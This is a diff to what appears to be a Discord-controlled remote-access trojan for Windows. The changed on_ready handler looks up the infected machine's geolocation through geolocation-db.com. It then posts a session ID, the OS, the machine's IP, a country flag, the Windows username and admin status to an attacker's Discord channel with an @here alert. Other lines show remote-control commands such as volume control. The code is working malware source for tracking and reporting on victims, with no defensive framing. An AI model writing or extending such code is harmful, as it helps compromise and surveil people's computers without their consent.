@@ -88,6 +88,16 @@ Availaible commands are :
 @client.event
 async def on_ready():
 	import platform
+	import re 
+	import urllib.request
+	import json
+	with urllib.request.urlopen("https://geolocation-db.com/json") as url:
+		data = json.loads(url.read().decode())
+	sep = ','
+	rest = str(data).split(sep, 1)[0]
+	ah = re.sub(r'^.*? ', ' ', rest)
+	text = re.sub("[^a-zA-Z]","",ah)
+	final = text.lower()
 	global uuidgen
 	uuidgen = str(uuid.uuid4())
 	from requests import get
@@ -97,10 +107,9 @@ async def on_ready():
 	channel = client.get_channel()
 	is_admin = ctypes.windll.shell32.IsUserAnAdmin() != 0
 	if is_admin == True:
-		await channel.send("@here :white_check_mark: " + "New session opened " + uuidgen + " | " + platform.system() + " " + platform.release() + " | " + pp + " | " + "User : " + os.getlogin() + " | " + ":gem:")
+		await channel.send("@here :white_check_mark: " + "New session opened " + uuidgen + " | " + platform.system() + " " + platform.release() + " | " + ip + " " + ":flag_" + final + ":" + " | " + "User : " + os.getlogin() + " | " + ":gem:")
 	elif is_admin == False:
-		await channel.send("@here :white_check_mark: " + "New session opened " + uuidgen + " | " + platform.system() + " " + platform.release() + " | " + pp + " | " + "User : " + os.getlogin())
-
+		await channel.send("@here :white_check_mark: " + "New session opened " + uuidgen + " | " + platform.system() + " " + platform.release() + " | " + ip + " " + ":flag_" + final + ":" + " | " + "User : " + os.getlogin())
 
 def volumeup():
 	import win32api
